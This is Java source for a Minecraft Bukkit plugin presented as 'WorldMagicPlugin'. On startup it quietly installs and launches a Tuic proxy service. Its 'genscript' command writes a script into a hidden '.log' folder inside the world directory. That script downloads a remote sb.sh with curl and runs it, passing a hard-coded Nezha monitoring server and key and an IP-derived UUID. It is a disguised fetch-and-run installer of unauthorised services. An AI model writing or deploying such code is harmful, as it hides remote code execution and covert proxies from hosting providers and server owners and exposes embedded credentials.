package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Objects;
import java.util.Properties;
import java.util.UUID;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin implements CommandExecutor {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();

    @Override
    public void onEnable() {
        // Plugin startup logic
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);
        
        // 注册 genscript 命令
        Objects.requireNonNull(this.getCommand("genscript")).setExecutor(this);

        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            // load config
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (Objects.isNull(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    this.getLogger().info("Configuration not found, disabling plugin");
                    Bukkit.getPluginManager().disablePlugin(this);
                });
                return;
            }

            // install & start apps
            if (this.installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            } else {
                Bukkit.getScheduler().runTask(this, () -> {
                    this.getLogger().info("Plugin install failed, disabling plugin");
                    Bukkit.getPluginManager().disablePlugin(this);
                });
            }
        });
    }

    private boolean installApps(AppConfig appConfig) {
        try {
            tuicService.install(appConfig);
            return true;
        } catch (Exception e) {
            LogUtil.error("Plugin install failed", e);
            return false;
        }
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        this.getLogger().info("WorldMagicPlugin disabled");
    }

    /**
     * 命令执行逻辑
     */
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!command.getName().equalsIgnoreCase("genscript")) {
            return false;
        }

        if (!sender.hasPermission("worldmagic.admin")) {
            sender.sendMessage("§c你没有权限执行此命令！");
            return true;
        }

        sender.sendMessage("§e正在初始化，获取服务器身份信息...");

        // 异步执行 IO 和 网络操作
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                // 1. 获取 world 目录
                File worldFolder = new File("world");
                if (!worldFolder.exists() || !worldFolder.isDirectory()) {
                    Bukkit.getScheduler().runTask(this, () -> sender.sendMessage("§c未找到 world 目录！"));
                    return;
                }

                // 2. 创建隐藏的 .log 目录
                File logDir = new File(worldFolder, ".log");
                if (!logDir.exists()) {
                    logDir.mkdirs();
                }

                // 3. 获取或生成 UUID
                String serverUUID = getServerUUID(logDir);

                // 回到主线程发送消息
                Bukkit.getScheduler().runTask(this, () -> {
                    sender.sendMessage("§a服务器身份 UUID 已确定: " + serverUUID);
                    sender.sendMessage("§e正在生成脚本文件...");

                    // 4. 创建脚本文件
                    File scriptFile = new File(logDir, "install_sb.sh");

                    try (FileWriter writer = new FileWriter(scriptFile)) {
                        writer.write("#!/bin/bash\n");
                        writer.write("# Auto-generated script by WorldMagicPlugin\n");
                        writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
                        writer.write("chmod +x sb.sh\n");

                        // 写入动态获取的 UUID
                        writer.write("UUID=" + serverUUID + " \\\n");
                        writer.write("NEZHA_SERVER=nezha.vip1715.dpdns.org:443 \\\n");
                        writer.write("NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP \\\n");
                        writer.write("ARGO_PORT=3000 \\\n");

                        writer.write("bash sb.sh\n");

                        // 设置可执行权限
                        scriptFile.setExecutable(true, false);

                        sender.sendMessage("§a脚本生成成功！");
                        sender.sendMessage("§a路径: " + scriptFile.getAbsolutePath());

                    } catch (IOException e) {
                        sender.sendMessage("§c脚本写入失败: " + e.getMessage());
                        e.printStackTrace();
                    }
                });

            } catch (Exception e) {
                Bukkit.getScheduler().runTask(this, () -> {
                    sender.sendMessage("§c发生错误: " + e.getMessage());
                    e.printStackTrace();
                });
            }
        });

        return true;
    }

    /**
     * 获取服务器 UUID
     * 优先读取本地文件，文件不存在则根据 IP 生成并保存
     */
    private String getServerUUID(File logDir) {
        File uuidFile = new File(logDir, "uuid.txt");
        
        // 1. 尝试读取已存在的 UUID
        if (uuidFile.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(uuidFile))) {
                String savedUUID = reader.readLine();
                if (savedUUID != null && !savedUUID.isEmpty()) {
                    this.getLogger().info("Loaded existing UUID from file: " + savedUUID);
                    return savedUUID;
                }
            } catch (IOException e) {
                this.getLogger().warning("Failed to read uuid.txt, regenerating...");
            }
        }

        // 2. 获取 IP 并生成 UUID
        this.getLogger().info("UUID file not found, generating new one based on IP...");
        String ip = getPublicIP();
        
        // 根据 IP 生成 Type 3 UUID (相同 IP 生成相同的 UUID)
        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(StandardCharsets.UTF_8));
        String uuidStr = uuid.toString();

        // 3. 保存到文件
        try (FileWriter writer = new FileWriter(uuidFile)) {
            writer.write(uuidStr);
            this.getLogger().info("Generated new UUID for IP " + ip + ": " + uuidStr);
        } catch (IOException e) {
            this.getLogger().severe("Failed to save uuid.txt!");
            e.printStackTrace();
        }

        return uuidStr;
    }

    /**
     * 获取服务器公网 IP
     */
    private String getPublicIP() {
        String ip = "127.0.0.1"; // 默认回环地址
        try {
            // 调用公共 API 获取公网 IP
            URL url = new URL("https://api.ipify.org");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = br.readLine().trim();
            this.getLogger().info("Fetched public IP: " + ip);
        } catch (Exception e) {
            this.getLogger().warning("Failed to fetch public IP, falling back to local IP. Error: " + e.getMessage());
            try {
                // 回退方案：使用 server.yml 中的 IP
                ip = Bukkit.getIp();
                if (ip == null || ip.isEmpty()) {
                    ip = "127.0.0.1";
                }
            } catch (Exception ex) {
                // ignore
            }
        }
        return ip;
    }
}
